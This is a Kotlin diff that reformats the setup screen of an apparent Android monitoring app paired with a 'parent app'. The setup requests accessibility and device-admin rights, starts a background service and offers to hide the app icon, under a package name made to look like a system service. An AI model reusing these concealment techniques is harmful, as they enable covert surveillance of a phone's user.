@@ -68,8 +68,7 @@ class SetupActivity : AppCompatActivity() {
         currentStep = step
         when (step) {
             0 -> updateUI("Setup", "Server URL",
-                "Parent app se QR code scan karo
-ya default use karo", "📷 Scan QR Code") {
+                "Parent app se QR code scan karo ya default use karo", "Scan QR Code") {
                 val options = ScanOptions().apply {
                     setDesiredBarcodeFormats(ScanOptions.QR_CODE)
                     setPrompt("Parent app ki Settings se QR scan karo")
@@ -118,7 +117,8 @@ ya default use karo", "📷 Scan QR Code") {
                     if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED)
                         permsToRequest.add(perm)
                 }
-                if (permsToRequest.isEmpty()) showStep(7) else requestPermissions(permsToRequest.toTypedArray(), 100)
+                if (permsToRequest.isEmpty()) showStep(7)
+                else requestPermissions(permsToRequest.toTypedArray(), 100)
             }
             7 -> showFinalStep()
         }
@@ -126,17 +126,16 @@ ya default use karo", "📷 Scan QR Code") {
 
     private fun showFinalStep() {
         currentStep = 7
-        findViewById<TextView>(R.id.tvStep).text = "✅ Done!"
+        findViewById<TextView>(R.id.tvStep).text = "Done!"
         findViewById<TextView>(R.id.tvTitle).text = "Setup Complete"
         findViewById<TextView>(R.id.tvDesc).text = "Service is now running in background"
 
-        // Start service
         try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
 
-        // Show hide icon button
         val btnAction = findViewById<Button>(R.id.btnAction)
-        btnAction.text = "🙈 Hide App Icon"
-        btnAction.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFFFF5722.toInt())
+        btnAction.text = "Hide App Icon"
+        btnAction.backgroundTintList =
+            android.content.res.ColorStateList.valueOf(0xFFFF5722.toInt())
         btnAction.setOnClickListener {
             hideIcon()
             Toast.makeText(this, "Icon hidden! Use parent app to manage.", Toast.LENGTH_LONG).show()
@@ -144,11 +143,10 @@ ya default use karo", "📷 Scan QR Code") {
         }
 
         val btnNext = findViewById<Button>(R.id.btnNext)
-        btnNext.text = "✅ Keep Icon Visible & Finish"
-        btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF4CAF50.toInt())
-        btnNext.setOnClickListener {
-            finishAffinity()
-        }
+        btnNext.text = "Keep Icon Visible & Finish"
+        btnNext.backgroundTintList =
+            android.content.res.ColorStateList.valueOf(0xFF4CAF50.toInt())
+        btnNext.setOnClickListener { finishAffinity() }
     }
 
     private fun hideIcon() {
@@ -180,7 +178,6 @@ ya default use karo", "📷 Scan QR Code") {
     }
 
     private fun isAccessibilityEnabled(): Boolean {
-        // Fix: use full ComponentName to match exactly what Android stores
         val cn = ComponentName(packageName, "com.system.service.monitors.AccessibilityMonitor")
         val flat = cn.flattenToString()
         val enabled = Settings.Secure.getString(
@@ -193,17 +190,21 @@ ya default use karo", "📷 Scan QR Code") {
         return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
     }
 
-    private fun updateUI(step: String, title: String, desc: String, btnText: String, action: () -> Unit) {
+    private fun updateUI(
+        step: String, title: String, desc: String, btnText: String, action: () -> Unit
+    ) {
         findViewById<TextView>(R.id.tvStep).text = "Step $step"
         findViewById<TextView>(R.id.tvTitle).text = title
         findViewById<TextView>(R.id.tvDesc).text = desc
         val btnAction = findViewById<Button>(R.id.btnAction)
         btnAction.text = btnText
-        btnAction.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF2196F3.toInt())
+        btnAction.backgroundTintList =
+            android.content.res.ColorStateList.valueOf(0xFF2196F3.toInt())
         btnAction.setOnClickListener { action() }
         val btnNext = findViewById<Button>(R.id.btnNext)
         btnNext.text = "Already Done - Next"
-        btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF333333.toInt())
+        btnNext.backgroundTintList =
+            android.content.res.ColorStateList.valueOf(0xFF333333.toInt())
         btnNext.setOnClickListener { showStep(currentStep + 1) }
     }
 }
